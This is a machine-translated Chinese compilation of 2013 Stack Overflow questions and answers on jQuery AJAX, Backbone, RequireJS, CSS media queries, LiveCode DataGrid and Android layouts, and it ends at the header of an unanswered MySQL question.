我一直试图让我的 AJAX 工作几天，但我不明白为什么它不起作用。它不会发出任何警告并给我一个错误：`Failed to load resource: the server responded with a status of 404 (Not Found) - [object%20Object]`它还不断返回所有内容 NULL、JS、PHP。不知道为什么。

**JS**

```
var fullName = ["John Doe", "Jane Doe"];

$(window).load(function(){
    getList();
});

function getList(){
    $.getJSON({
       type: "GET", /* the request's method: */
       url:"/names.php",    /* the request's location: */
       data: JSON.stringify({names: fullName}), /* the request's fields: */
       contentType: "application/json; charset=utf-8",  /* the request's content-type : */
       dataType:"json", /* the response's content-type: */
       success: function(json){ /* the callback function */
         if(json.length > 0){
             $.each(json, function(i, v){
                console.info(v);
             });
          }
          else {
             alert('wtf?!');
          }
        }
    });
} 
```

**PHP**

```
<?php
$req=array_merge($_GET, $_POST);

$names=json_decode($req['names'], true);
header('content-type: application/json; charset=utf8;');
echo json_encode($names); 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-07T03:41:46.190

您应该使用`$.ajax`而不是`getJSON`. jQuery 认为整个配置对象就是 URL！

此外，当您将其更改为 时`.ajax`，您不必`JSON.stringify`输入数据，这将自动完成。所以代码应该是：

```
function getList(){
    $.ajax({
       type: "GET", /* the request's method: */
       url:"/names.php",    /* the request's location: */
       data: {names: fullName}, /* the request's fields: */
       contentType: "application/json; charset=utf-8",  /* the request's content-type : */
       dataType:"json", /* the response's content-type: */
       success: function(json){ /* the callback function */
         if(json.length > 0){
             $.each(json, function(i, v){
                console.info(v);
             });
         } else {
            alert('wtf?!');
         }
       }
    });
} 
```

使用 getJSON 的较短版本可能是：

```
function getList(){
    $.getJSON("/names.php", {names: fullName}, function(json){ 
         if(json.length > 0){
             $.each(json, function(i, v){
                console.info(v);
             });
         } else {
             alert('wtf?!');
         }
    });
} 
```

但随后请求将不会作为 JSON 发送（只有响应应该是 JSON）。所以你需要对你的 PHP 稍作改动：

```
<?php
$names=$_GET['names'];
header('content-type: application/json; charset=utf8;');
echo json_encode($names); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-07T03:42:29.867

`.getJSON`如果 URL 中的路径是正确的，则将您的代码更改为`.ajax`，其余的应该工作。

[API 文档](http://api.jquery.com/jQuery.ajax/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-07T03:53:55.300

在[jQuery docs](http://api.jquery.com/jQuery.getJSON/)中，jQuery.getJSON 是以下内容的简写：

```
$.ajax({
    dataType: "json",
    url: url,
    data: data,
    success: success
}); 
```

所以你应该这样使用：

```
$.getJSON('/names.php', {names: fullName}, 
    function(data) {...}
); 
```

# android - 可以取消任务

> ID：15262642
> 
> 赞同：0
> 
> 时间：2013-03-07T03:38:09.750
> 
> 标签：android, commonsware-cwac

给你一些背景：

我让用户在搜索操作视图中输入。在文本框的每个更改事件之后，我想使用通用 API 访问 Web，并`listview`使用 Endless Adapter 显示返回的数据。

目前我使用检索数据`cacheInBackground()`，然后使用`appendCachedData()`.

但是，如果用户打字速度很快，我想取消当前正在运行的任务，以便开始新的任务。当前，旧任务正在运行`appendCachedData()`并将旧结果放入其中，`listview`因为 API 调用可能需要一两秒才能返回数据，但用户输入速度非常快。

以正确的方式执行此操作的推荐操作是什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T11:42:17.820

> 以正确的方式执行此操作的推荐操作是什么？

恕我直言，“推荐的行动”是不要这样做：

> 在文本框的每个更改事件之后，我想使用通用 API 访问 Web，并使用 Endless Adapter 在列表视图中显示返回的数据

任何一个：

*   将所有数据保存在设备上，这样您就可以过滤 sans `EndlessAdapter，或者
*   `EndlessAdapter`仅在积极的用户操作（例如，单击搜索图标）上执行网络 I/O 和内容

# php - ExtJS 和自动加载 URL

> ID：15262650
> 
> 赞同：3
> 
> 时间：2013-03-07T03:38:50.723
> 
> 标签：php, javascript, extjs

我正在使用一个需要使用 index.php 文件的 php 框架（可以使用 .htaccess 删除，但在我目前的情况下我不希望这样做）。问题在于，在某些情况下，ExtJS 会在 URL 处自动加载类，如下所示

```
mysite.com/index.php/path/to/file.js 
```

有没有办法设置加载 ExtJS 类的 URL？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T07:26:06.330

如果您使用的是 app.js 和 loader，那么您需要设置 2 件事：Ext.application 配置中的 appFolder 属性和应用程序结构之外任何其他组件的 Loader 上的路径配置。

像这样：

```
Ext.application({
    name:'MyApp',
    appFolder:'js/MyApp/app' 
```

和

```
Ext.Loader.setConfig({
  enabled:true,
  paths: {
      'Ext.ux': 'js/extjs/ux'
  } 
```

# jquery - 主干选项选择适用于 Firefox，但不适用于 Chrome

> ID：15262651
> 
> 赞同：2
> 
> 时间：2013-03-07T03:38:59.327
> 
> 标签：jquery, google-chrome, backbone.js

我正在使用 Backbone 来处理单击选择框中的选项。出于某种原因，它适用于 Firefox，但不适用于 Chrome。

这不是“[在 Chrome 中使用本地文件](http://code.google.com/p/chromium/issues/detail?id=40787&q=ajax%20local&colspec=ID%20Stars%20Pri%20Area%20Feature%20Type%20Status%20Summary%20Modified%20Owner%20Mstone%20OS)”问题，因为这一切都在我的服务器上运行。

在下面的代码片段中，`FieldView`代表选择列表中的单个 <option>。在 Firefox 中，单击任何选项将运行该`clicked()`功能。在 Chrome 中，当我单击任何选项时似乎什么都没有发生。

```
var FieldView = Backbone.View.extend({
    tagName: "option",

    initialize: function () {
        _.bindAll(this, 'render');
    },
    events: {
        "click": "clicked"
    },
    clicked: function (e) {
        var a_display_name = this.model.get("display_name");
        var console_out = "selected " + a_display_name
        console.log(console_out);
        $("#fake_console").html(console_out);

    },
    render: function () {
        this.$el.attr('value', this.model.get('COLUMN_NAME')).html(this.model.get('display_name'));
        return this;
    }
}); 
```

[http://jsfiddle.net/thunderrabbit/QXAAW/3/](http://jsfiddle.net/thunderrabbit/QXAAW/3/)

我怎样才能让它在 Chrome 中工作？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T04:21:05.113

您应该**在更改**时使用[jQuery 文档](http://api.jquery.com/change/)。

要访问 FieldsView 集合中的模型，您可能应该通过向 FieldsView 添加事件来获取所选选项的索引：

```
events: {'change': 'optionChanged'},
optionChanged: function() {
    var index = this.$el.children('option:selected').index();
    var model = this.collection.at(index); // this is the model of the option view
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-07T04:41:37.667

这是 jsFiddle 的更新：http: [//jsfiddle.net/phoenecke/QXAAW/4/](http://jsfiddle.net/phoenecke/QXAAW/4/)

该`change`事件与`<select>`元素挂钩。然后您可以使用 的值找到模型`<select>`。另外，我添加`idAttribute: 'COLUMN_NAME'`到模型中，假设这是唯一的 id。

```
 events: {
            "change": "changed"
        },
        changed: function (e) {
            // the select's val is the value of the selected option
            var id = this.$el.val();
            // find model in the collection
            var model = this.collection.get(id);
            var a_display_name = model.get("display_name");
            var console_out = "selected " + a_display_name
            console.log(console_out);
            $("#fake_console").html(console_out);

        }, 
```

# javascript - 如何使用 javascript 删除标签？

> ID：15262653
> 
> 赞同：0
> 
> 时间：2013-03-07T03:39:07.560
> 
> 标签：javascript, dom, dotnetnuke

我有点苦恼。我想要实现的是删除一个 div 如果它是空的，然后做我必须做的事情，这很容易。困难的部分是试图删除空标签。我正在使用 DNN，它喜欢放入空标签，如 p 和 br。我希望能够在执行我的检查之前删除它们。到目前为止，这是我的代码

```
$(document).ready(function(){
var element = document.getElementsByTagName("p"); //Need to remove all tags. not just P
element.parentNode.removeChild(element); //Doesn't target which child

if( !$.trim( $('#container2Test').html() ).length ) {
    alert("empty");
    $('#container2Test').remove();
    $('#container3Test').css({'width' : '50%', 'background-color' : '#3F0'});
    $('#container3Test').append("This is some content");
}
else{
    alert("not empty");
}
}); 
```

的HTML：

```
<div id="container1Test" style="width:30%; height:10em; background-color:#000;">
</div>
<div id="container2Test" style="width:50%; height:10em; background-color:#666;">
    <p></p><br /><p></p>
</div>
<div id="container3Test" style="width:20%; height:10em; background-color:#F66;">
</div>
</html 
```

我已经尝试了很多选项来尝试删除标签，但我没有这样的运气:(请帮忙！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-07T03:42:24.937

就您的`container2test`块而言，请尝试使用`.text()`而不是`.html()`. 这将忽略插入的空标签并仅关注文本内容。

关于它上面的部分，我不太确定你想要实现什么。如果您实施我前面提到的更改，我认为不需要它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-07T04:00:26.150

我认为这将是您需要的解决方案...检查一下：

```
var elmsToClear = $('#container1Test, #container2Test, #container3Test');
elmsToClear.each(function(){
    while($(this).find('*:empty').remove().length); // recursivly kill all empty elements
    if(!$(this).find('*').length){ // if no elements left - kill the parent
        alert($(this).attr('id') + ' is empty...');
        $(this).remove();
    }
    else{ // there is something in here...
        alert($(this).attr('id') + ' is NOT empty...');
    }
}); 
```

>>>[解决问题的 JS-Fiddle](http://jsfiddle.net/T3ggB/) <<<

问候 ;）

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-03-07T03:59:31.420

注意`getElementsByTagName`是复数：

```
var elements = document.getElementsByTagName("p");
for (var n=0; n < elements.length; n++) {
    var element = elements[n];
    element.parentNode.removeChild(element); // should work now
} 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2014-10-29T00:22:15.100

有一个[removeChild()](https://developer.mozilla.org/en-US/docs/Web/API/Node.removeChild)函数。那么为什么你不能做这样的事情：

```
$('div').each(function(){
   if(this.innerHTML == ''){
      this.parentNode.removechild(this);
   }
}); 
```

（没有测试过这个）

# ip-address - 环回地址

> ID：15262655
> 
> 赞同：1
> 
> 时间：2013-03-07T03:39:47.123
> 
> 标签：ip-address, ping, loopback-address

当我 ping 127.0.0.1 和 127 系列的任何地址（127.0.0.0 和 127.255.255.255 除外）时，我没有发现任何区别。有人可以对此发表评论吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T03:42:20.120

您的计算机是 127.xxx 网络。不管只有你能从你的机器上ping它。其他机器将不得不 ping 您指定或从 DHCP 服务器检索到的机器地址。

# backbone.js - 使用require js加载主干和主干关系

> ID：15262657
> 
> 赞同：1
> 
> 时间：2013-03-07T03:40:01.943
> 
> 标签：backbone.js, requirejs, backbone-relational

大家好，我每次只需要'backbone'时都试图在require js中加载主干和主干关系，这是我的代码：

主.js：

```
requirejs.config({
    paths: {
        'domReady': 'lib/require/domReady',
        'text': 'lib/require/text',
        'jquery': 'lib/jquery/jquery',
        'underscore': 'lib/underscore',
        'backbone': 'lib/backbone/loader',
        'relational': 'lib/backbone/relational',
        'iosync': 'lib/backbone/iosync',
        'iobind': 'lib/backbone/iobind'
    },
    shim: {
        'underscore': {
            exports: '_'
        },
        'backbone': {
            deps: ['underscore', 'jquery'],
            exports: 'Backbone'
        },
        'relational': {
            deps: ['backbone']
        },
        'iobind': {
            deps: ['backbone']
        },
        'iosync': {
            deps: ['backbone']
        }
    }
});

require([
    'domReady!',
    'jquery',
    'backbone',
    'models/application',
    'views/application'
], function () {
    // start the app
    var applicationModel = new BACON.models.Application();
    var applicationView = new BACON.views.Application({
        el: $('body'),
        model: applicationModel
    });
}); 
```

和 lib/backbone/loader.js：

```
define([
    'lib/backbone/backbone',
    'relational',
    'iobind',
    'iosync'
]); 
```

但是在 chrome 上运行我的应用程序给了我：

```
Uncaught Error: Load timeout for modules: relational,iobind,iosync 
```

所以看来我有一个依赖循环......有没有办法让这个工作或者有另一种方法来完成这个？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T08:26:27.257

在您的 shim 配置中，您添加了与主干的关系的依赖关系，它指的是`libs/backbone/loader`，这会在加载 lib/backbone/loader.js 时生成一个循环。

如果需要，您应该将主干的路径配置更改为`'lib/backbone/backbone'`并为加载程序添加另一个命名路径。

# css - @media screen css 属性不起作用

> ID：15262659
> 
> 赞同：0
> 
> 时间：2013-03-07T03:40:31.397
> 
> 标签：css, screen, media

我添加了`@media screen`css 以更改我的网站，但它似乎没有响应。我在 HTML 中添加了元`name = "viewport" content="width=1200, width=device-width"`数据，这是唯一影响我的网站在手机上显示的方式。在 CSS 中，我添加了以下内容，但没有任何效果。

```
@media screen
and (max-device-width: 768px)
and (orientation: portrait) {
   body {
   max-width: 600px;
}
   #sidebar {
     width: 0;
   }
}

@media screen
and (max-device-width: 1000px)
and (orientation: landscape) {
  body {
    max-width: 800px;
  }
    #sidebar {
        width: 0;
    }
} 
```

那么我该怎么做：

*   让它工作，我的 CSS 错了吗？

*   有没有办法专门摆脱`#sidebar`in `@media screen`css？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T03:53:17.100

试试这个（未测试）

```
@media handheld and (orientation: landscape), 
  screen and (max-width: 1000px) {

 body {
    max-width: 800px;
  }

 #sidebar {
    width: 0;
 }

} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-07T03:53:31.903

您的手机可能缓存了旧版本的 CSS 文件（更改之前）。如果你有 PHP，一个很好的解决方法是：

```
<link rel="stylesheet" href="styles.css?ver=<?php print filemtime('styles.css') ?>"> 
```

这样，样式表只会在需要时重新下载。

如果您没有 PHP，您可以在`?ver=`每次更改 CSS 文件时手动更改参数。

这可能是也可能不是你的问题，我不知道。但这可能会有所帮助。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-07T06:06:30.627

代码在我看来没问题。您是否尝试过硬刷新？

当您没有注意到应用的设置时，根据我的经验，shft + f5 修复了 CSS。删除缓存也有帮助！

还要摆脱#sidebar

```
#sidebar{
    display:none;
} 
```

当你点击你的@media 时会隐藏它。希望有帮助:)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-08T02:01:14.117

@media 适用于一切。例如，我的手机的宽度为 720 像素。当您拥有 720 像素的 CSS @media for mobile 时；如果有意义，将应用以下 CSS。如果这是您想要实现的目标，则应该阅读移动优先响应式设计，但这是一个完全不同的主题。至于您@media 中的代码，您的目标是移动设备，而不是笔记本电脑/计算机。以防你不知道这一点。所以如果我想对了，CSS 将只适用于移动设备。对于笔记本电脑/个人电脑，@media (max-width: xxxpx) {} 会这样做:)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-09T05:50:57.747

感谢 Akira Dawson 的展示部分。看来我需要去掉 content="width=1200" 才能在我的 iPhone 上正确显示。此外，我最终所做的是摆脱了@media 屏幕并将其更改为@media 手持设备，以便它在我的 iPhone 上生效。无论出于何种原因，@media screen 都不起作用。这很有趣，因为有人告诉我@media 手持设备不能在 iPhone 上工作，但显然可以。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-04-03T23:11:13.683

据我了解，它`content="width=1200`说您的网站需要*至少*1200 像素的视口，这与`max-device-width: 768px`

`<meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0" />`应该可以解决您的问题。

来源：[https ://developer.mozilla.org/en-US/docs/Mobile/Viewport_meta_tag](https://developer.mozilla.org/en-US/docs/Mobile/Viewport_meta_tag)

# datagrid - 如何在 LiveCode DataGrid 中创建扩展字段编辑器？

> ID：15262660
> 
> 赞同：0
> 
> 时间：2013-03-07T03:40:38.650
> 
> 标签：datagrid, livecode

我需要在 LiveCode DataGrid 中创建一个字段编辑器，该编辑器会随着用户类型的增长而增长以适应字段的 formattedHeight。底层行控件的其余部分也需要调整大小，同时向下移动任何后续行控件。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-07T03:40:38.650

回答我自己的问题，因为它可能对其他人有用。

将字段编辑器行为按钮从 revDataGridLibrary 堆栈复制到上面带有行模板的卡片。

编辑要编辑的字段的脚本，如下所示（请注意，您需要将行为按钮引用修复为新字段编辑行为的长 id）：

```
on preOpenFieldEditor pEditor
   set the behavior of pEditor to the long id of button id 1023 of card id 1010 of stack "Data Grid Templates 1362091650635"
   set the uRowControl of pEditor to the long id of the owner of me
end preOpenFieldEditor 
```

编辑字段编辑器行为脚本，添加以下内容：

```
local sHeight,sRowControl

setProp uRowControl pRowControl
   put pRowControl into sRowControl
end uRowControl

on openField
   put the formattedHeight of me into sHeight
   pass openField
end openField

on textChanged
   local tHeight,tRect
   lock screen
   put the formattedHeight of me into tHeight
   if sHeight <> tHeight then
      put the rect of me into tRect
      put item 2 of tRect+ tHeight into item 4 of tRect
      set the rect of me to tRect
      put tHeight into sHeight
      dispatch "UpdateRow" to sRowControl with the long id of me
   end if 
   unlock screen
   pass textChanged
end textChanged 
```

现在编辑行模板行为，添加以下处理程序（请注意，在这种情况下，正在编辑的字段名为“note”，因此您需要为您的用例更改它）：

```
on UpdateRow pFieldEditor
   set the rect of graphic "Background" of me to the rect of pFieldEditor
   set the rect of fld "note" of me to the rect of pFieldEditor
   set the rect of me to the formattedRect of me
   put the uScriptLocal["sTableObjectsA"] of me into tTableObjectsA
   repeat for each line tControl in tTableObjectsA["all row controls"]
      delete word -2 to -1 of tControl -- of me
      put tControl into tControlA[the dgIndex of tControl]
   end repeat
   put the bottomLeft of me into tTopLeft
   repeat for each item tIndex in tTableObjectsA["current"]["indexes"]
      if tIndex > the dgIndex of me then
         set the topLeft of tControlA[tIndex] to tTopLeft
         put the bottomLeft of tControlA[tIndex] into tTopLeft
      end if
   end repeat
end UpdateRow 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-08T21:39:07.760

看起来很有用，蒙特。问题：为什么是 preOpenField 处理程序？该信息不能在设计时设置一次吗？每次调用编辑器时，DataGrid 是否都会创建一个新的字段控件？

# php - Zendframework 2 ( ZF2 ) Oath 库文档

> ID：15262668
> 
> 赞同：1
> 
> 时间：2013-03-07T03:41:52.723
> 
> 标签：php, oauth, zend-framework2

有谁知道在哪里可以找到 ZF2 Oauth 库的文档。我不确定他们是否已经完成了这个库。有什么线索吗？

我为 ZF1 找到了一个。* [http://framework.zend.com/manual/1.12/en/zend.oauth.introduction.html](http://framework.zend.com/manual/1.12/en/zend.oauth.introduction.html)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T19:26:39.447

这就是我能为您找到的全部内容：[https ://zf2.readthedocs.org/en/latest/modules/zendoauth.getting-started.html](https://zf2.readthedocs.org/en/latest/modules/zendoauth.getting-started.html)

我希望这会有所帮助=)

# android - 右对齐和左对齐放置在表格行内的线性布局

> ID：15262678
> 
> 赞同：0
> 
> 时间：2013-03-07T03:42:39.770
> 
> 标签：android

```
<?xml version="1.0" encoding="utf-8"?>
<TableLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/homeTableLayout"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent" >

<TableRow
    android:id="@+id/homeFirstRow"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:padding="5dip" >

    <LinearLayout
        android:id="@+id/navigationLayout"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_gravity="left"
        android:layout_marginLeft="10dp"
        android:background="#669cb7"
        android:orientation="horizontal" >

        <Button
            android:id="@+id/btnCall"
            android:layout_width="wrap_content"
            android:layout_height="45dp"
            android:text="@string/btn_call_text"
            android:textSize="15sp" />

        <Button
            android:id="@+id/btnPicture"
            android:layout_width="wrap_content"
            android:layout_height="45dp"
            android:text="@string/btn_take_pictures_text"
            android:textSize="15sp" />

        <Button
            android:id="@+id/btnNavigate"
            android:layout_width="wrap_content"
            android:layout_height="45dp"
            android:text="@string/btn_navigate_text"
            android:textSize="15sp" />

        <Button
            android:id="@+id/btnedo"
            android:layout_width="wrap_content"
            android:layout_height="45dp"
            android:text="@string/btn_pod_text"
            android:textSize="15sp" />
    </LinearLayout>

    <LinearLayout
        android:id="@+id/distanceLayout"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_marginLeft="10dp"
        android:background="#FFC58F"
        android:gravity="center"
        android:orientation="horizontal" >

        <TextView
            android:id="@+id/tv"
            android:layout_width="fill_parent"
            android:layout_height="wrap_content"
            android:text="SOURCE TO DESTINATION COMES HERE" />

        <TextView
            android:id="@+id/txtFrom"
            android:layout_width="fill_parent"
            android:layout_height="wrap_content"
            android:text="" />

        <TextView
            android:id="@+id/txtTo"
            android:layout_width="fill_parent"
            android:layout_height="wrap_content"
            android:text="" />

        <TextView
            android:id="@+id/txtETA"
            android:layout_width="fill_parent"
            android:layout_height="wrap_content"
            android:text="" />

        <TextView
            android:id="@+id/txtDistance"
            android:layout_width="fill_parent"
            android:layout_height="wrap_content"
            android:text="" />
    </LinearLayout>

    <LinearLayout
        android:id="@+id/expandingLayout"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_gravity="right"
        android:layout_marginLeft="10dp"
        android:background="#FFC58F"
        android:orientation="horizontal" >

        <Button
            android:id="@+id/btnLanguage"
            android:layout_width="wrap_content"
            android:layout_height="45dp"
            android:text="@string/btn_language_text"
            android:textSize="15sp" />

        <Button
            android:id="@+id/btnImages"
            android:layout_width="wrap_content"
            android:layout_height="45dp"
            android:text="@string/btn_image_text"
            android:textSize="15sp" />

        <Button
            android:id="@+id/btnMessages"
            android:layout_width="wrap_content"
            android:layout_height="45dp"
            android:text="@string/btn_job_text"
            android:textSize="15sp" />

        <Button
            android:id="@+id/btnAlerts"
            android:layout_width="wrap_content"
            android:layout_height="45dp"
            android:text="@string/btn_alert_text"
            android:textSize="15sp" />

        <Button
            android:id="@+id/btnlogout"
            android:layout_width="wrap_content"
            android:layout_height="45dp"
            android:text="@string/btn_logout_text"
            android:textSize="15sp" />
    </LinearLayout>
</TableRow> 
```

嗨，上面是我的主屏幕实现，我想左对齐第一个线性布局，居中对齐第二个布局，右对齐最后一个布局。有人知道怎么做吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-07T04:23:34.163

默认情况下，如果 TableRow 内的所有子元素都可以在屏幕边界内绘制，那么 TableView 将为每个 LinearLayout 子元素分配相等的区域，它们将自动左对齐、居中和右对齐。

在您的情况下，每个 LinearLayouts 都有 4 个或更多视图，其中包含一些难以适应屏幕边界的文本。因此，TableLayout 只会从第一个孩子开始绘制适合屏幕的任何内容。

1.  您可以尝试使用**带有 weightSum=3 的 LinearLayout 而不是 TableRow**，并为每个子 LinearLayout 赋予 1 的权重。
2.  此外，检查**您的按钮是否具有默认的 MinWidth，**如果您确信所有文本都可以显示在屏幕上且视图不会溢出屏幕，则将其删除
3.  **使用重力（左、中、右）**来控制内部布局相对于父级的位置。请注意，layout_gravity 仅在父级是 LinearLayout 时才有效。
4.  您也可以使用RelativeLayout，但如果您尝试将它们分别精确定位在左侧、中心和右侧，则内部LinearLayouts 可能会重叠。

    ```
    <LinearLayout android:orientation=horizontal
                  android:weightSum=3 >
        <LinearLayout android:layout_width=0dp 
                      android:layout_weight=1
                      android:layout_gravity=left >
        <LinearLayout android:layout_width=0dp 
                      android:layout_weight=1
                      android:layout_gravity=center >
        <LinearLayout android:layout_width=0dp 
                      android:layout_weight=1
                      android:layout_gravity=right >
    </LinearLayout> 
    ```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-07T04:02:06.157

尝试使用 weightsum 和方向来实现你想要的。

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/homeTableLayout"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:weightSum="10"
    android:orientation="horizontal"
     >

<LinearLayout
        android:id="@+id/navigationLayout"
        android:layout_width="0dip"
        android:layout_height="fill_parent"
        android:layout_gravity="left"
        android:background="#669cb7"
        android:orientation="vertical"
        android:layout_weight="3.3"

        >

        <Button
            android:id="@+id/btnCall"
            android:layout_width="fill_parent"
            android:layout_height="45dp"
            android:text="btn_call_text"
            android:textSize="15sp" />

        <Button
            android:id="@+id/btnPicture"
            android:layout_width="fill_parent"
            android:layout_height="45dp"
            android:text="btn_take_pictures_text"
            android:textSize="15sp" />

        <Button
            android:id="@+id/btnNavigate"
            android:layout_width="fill_parent"
            android:layout_height="45dp"
            android:text="btn_navigate_text"
            android:textSize="15sp" />

        <Button
            android:id="@+id/btnedo"
            android:layout_width="fill_parent"
            android:layout_height="45dp"
            android:text="btn_pod_text"
            android:textSize="15sp" />
    </LinearLayout>

    <LinearLayout
        android:id="@+id/distanceLayout"
        android:layout_width="0dip"
        android:layout_height="fill_parent"
        android:background="#FFC58F"
        android:gravity="center"
        android:orientation="vertical"
        android:layout_weight="3.3" 
        >

        <TextView
            android:id="@+id/tv"
            android:layout_width="fill_parent"
            android:layout_height="45dp"
            android:text="SOURCE TO DESTINATION COMES HERE" />

        <TextView
            android:id="@+id/txtFrom"
            android:layout_width="fill_parent"
            android:layout_height="45dp"
            android:text="" />

        <TextView
            android:id="@+id/txtTo"
            android:layout_width="fill_parent"
            android:layout_height="45dp"
            android:text="" />

        <TextView
            android:id="@+id/txtETA"
            android:layout_width="fill_parent"
            android:layout_height="45dp"
            android:text="" />

        <TextView
            android:id="@+id/txtDistance"
            android:layout_width="fill_parent"
            android:layout_height="45dp"
            android:text="" />
    </LinearLayout>

    <LinearLayout
        android:id="@+id/expandingLayout"
        android:layout_width="0dip"
        android:layout_height="fill_parent"
        android:layout_gravity="right"
        android:background="#FFC58F"
        android:orientation="vertical"
        android:layout_weight="3.4" 
        >

        <Button
            android:id="@+id/btnLanguage"
            android:layout_width="wrap_content"
            android:layout_height="45dp"
            android:text="btn_language_text"
            android:textSize="15sp" />

        <Button
            android:id="@+id/btnImages"
            android:layout_width="wrap_content"
            android:layout_height="45dp"
            android:text="btn_image_text"
            android:textSize="15sp" />

        <Button
            android:id="@+id/btnMessages"
            android:layout_width="wrap_content"
            android:layout_height="45dp"
            android:text="btn_job_text"
            android:textSize="15sp" />

        <Button
            android:id="@+id/btnAlerts"
            android:layout_width="wrap_content"
            android:layout_height="45dp"
            android:text="btn_alert_text"
            android:textSize="15sp" />

        <Button
            android:id="@+id/btnlogout"
            android:layout_width="wrap_content"
            android:layout_height="45dp"
            android:text="btn_logout_text"
            android:textSize="15sp" />
    </LinearLayout>

</LinearLayout> 
```

结果将是这样的：

![在此处输入图像描述](../Images/965e8feb3241c06136bf408b50bbbda7.png)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-07T04:03:35.040

1.  您确定所有这些按钮都适合一个屏幕吗？
2.  您可以使用 RelativeLayout 作为 3 个线性布局的包装器
3.  或者您可以使用带有 weightSum 的 LinearLayout 包装器

> ```
> <RelativeLayout>
> <LinearLayout android:layout_alignParentLeft="true">
> <LinearLayout android:layout_toRightOf="@id/linear1>
> <LinearLayout android:layout_toRightOf="@id/linear2 android:layout_alignParentRight="true">
> <RelativeLayout> 
> ```

# javascript - jquery在选择框中选择多个值

> ID：15262679
> 
> 赞同：-1
> 
> 时间：2013-03-07T03:42:46.723
> 
> 标签：javascript, jquery, html, json

我有选择框（多个属性），称为“c0r1”，它包含选项：

```
<select id="c0r1" multiple="multiple" class="fcv">
     <option value="A">A</option>
     <option value="B">B</option>
     <option value="C">C</option>
</select> 
```

我也有对象“foo”

```
 "foo" : {
       "bar": ["x", "y", "z"],
       "teal" : [
            {"x" : ["A"], "y" : [...], "z" : [...]},
            {"x" : [...], "y" : [...], "z" : [...]},
            {"x" : [...], "y" : [...], "z" : [...]}
        ]
 } 
```

bar 存储一组值，然后将其用作蓝绿色数组中对象的键。

c0r1（以及 c0r2、c1r1、...）的内容由“x”、“y”和“z”确定。在代码的其他地方，它们代表一组值。页面给选择框分配一个组，选项从组中填写（第一段HTML就是这样生成的）。

对于这个问题，c0r1 被分配（在代码的其他地方）“x”，其中包含值“A”、“B”和“C”

在没有深入了解事物为何如此的情况下，我需要获取 foo.teal.x 的值，并使用这些值并“选择”c0r1 中的相应值。

当我使用以下js时：

```
var blah = foo.bar[0]; //blah = x
var value = foo.teal[0][blah][0]; //value = A
$("#c0r1").val(value); 
```

没有选择任何内容。我已经使用调试器逐步完成，blah 和 value 被正确分配，并且 jQuery 不会抛出任何错误......只是，没有分配任何内容。

我也试过

```
$("#c0r1[value='" + value + "']").attr("selected", "selected");
//and
$("#c0r1[value='" + value + "']").prop("selected", true); 
```

这是我在网上其他地方找到的建议。

显然，一旦我完成了这项工作，我将构建代码以便选择所有值。为什么它不起作用，atm？

在页面的其他地方，我已经能够将 .val() 方法与相同的 json 对象和选择框一起使用，并且效果很好。然而，这是它是“倍数”的第一种情况。

谢谢，山姆。

**更新：**

嗯，刚刚想到：由于 DOM 元素 c0r1 及其选项是动态生成的，jQuery 是否可能不知道它们的存在？虽然我认为这会引发异常（这段代码没有这样做）。

**更新 2：**

我已经解决了，这个问题与这个问题中讨论的内容无关，这仅仅是因为在收到选项之前“选择”选项的代码正在运行。这些选项来自服务器响应，我没有想到会在服务器响应之前调用上述代码。

看起来我爱上了我的教授警告我的古老的“延迟为 0”谬误。

随意投反对票。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T03:50:45.333

您需要在`foo.teal`数组中的对象之间使用逗号：

```
 "foo" : {
       "bar": ["x", "y", "z"],
       "teal" : [
            {"x" : ["A"], "y" : [...], "z" : [...]}, // <-- here
            {"x" : [...], "y" : [...], "z" : [...]}, // <-- and here
            {"x" : [...], "y" : [...], "z" : [...]}
        ]
 } 
```

工作示例：http: [//jsfiddle.net/gKvWj/](http://jsfiddle.net/gKvWj/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-07T03:54:57.613

您使用 jQuery 选择器选择了错误的元素。它应该是`option`，而不是`select`，因此：

```
$('#c0r1 option[value="B"]').attr('selected', true); 
```

# mysql - 使用另一个表中的列更新一个表中的时间戳列

> ID：15262681
> 
> 赞同：0
> 
> 时间：2013-03-07T03:43:01.820
> 
> 标签：mysql, sql, sql-update

